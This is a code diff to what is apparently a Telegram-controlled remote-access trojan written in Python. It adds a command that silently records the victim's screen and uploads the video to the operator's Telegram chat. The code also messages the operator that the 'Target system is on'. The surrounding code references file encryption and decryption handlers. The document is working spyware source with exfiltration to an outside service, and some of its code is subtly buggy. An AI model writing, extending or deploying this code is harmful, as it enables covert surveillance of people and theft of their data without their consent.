@@ -5,11 +5,14 @@ from requests.exceptions import ConnectionError
 import subprocess
 import time
 from cryptography.fernet import Fernet
+import pyautogui
+import cv2
+import numpy as np
 
 
 
 bot=telebot.TeleBot("")
-chatids=["",""]
+chatids=[""]
 @bot.message_handler(commands=['start'])
 def start(message):
     # global directory
@@ -309,15 +312,64 @@ def antiransomeware(message):
         bot.reply_to(message,"File decryption Successful.......")
     except:
         bot.reply_to(message,"AntiRansomeware unsuccessful")
+
+@bot.message_handler(commands=['screenrecord'])
+def screen(message):
+    bot.reply_to(message,"Enter your length of the vido in secs: (example:10)")
+    bot.register_next_step_handler(message,recording)
+def recording(message):
+    try:
+        # Specify video resolution (adjust as needed)
+        resolution = (1920, 1080)
+
+        # Specify video codec (XVID in this case)
+        codec = cv2.VideoWriter_fourcc(*"mp4v")
+
+        # Specify output file name
+        filename = "Recording.mp4"
+
+        # Specify frames per second (FPS)
+        fps = 10.0
+
+        # Create a VideoWriter object
+        out = cv2.VideoWriter(filename, codec, fps, resolution)
+
+        # Optional: Create an empty window for real-time display
+        # cv2.namedWindow("Live", cv2.WINDOW_NORMAL)
+        # cv2.resizeWindow("Live", 480, 270)
+
+        # Start recording
+        i=0
+        while True:
+            img = pyautogui.screenshot()
+            frame = np.array(img)
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+            out.write(frame)
+            # cv2.imshow("Live", frame)
+            # if cv2.waitKey(1) == ord("q"):
+            if i==int(message.text)*60:
+                break
+            i=i+1
+
+        # Release the writer and close all windows
+        out.release()
+        cv2.destroyAllWindows()
+
+        with open("Recording.mp4","rb") as f:
+            bot.send_document(message.chat.id,f)
+        bot.reply_to((message,"Successfully Captured Screen....."))
+    except:
+        bot.reply_to(message,"Please enter valid number.")
+
 #Add below the chatid's to which you wanna forward alart when victic is online.
 for j in chatids:
     bot.send_message(j,"Target system is on......")
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except ConnectionError as e:
-        print(f"Connection error: {e}. Retrying...")
-        # Implement your retry logic here or just pass to retry on the next loop iteration
-    except Exception as e:
-        print(f"An unexpected error occurred: {e}")
-# bot.polling()
+# while True:
+#     try:
+#         bot.polling(none_stop=True)
+#     except ConnectionError as e:
+#         print(f"Connection error: {e}. Retrying...")
+#         # Implement your retry logic here or just pass to retry on the next loop iteration
+#     except Exception as e:
+#         print(f"An unexpected error occurred: {e}")
+bot.polling()
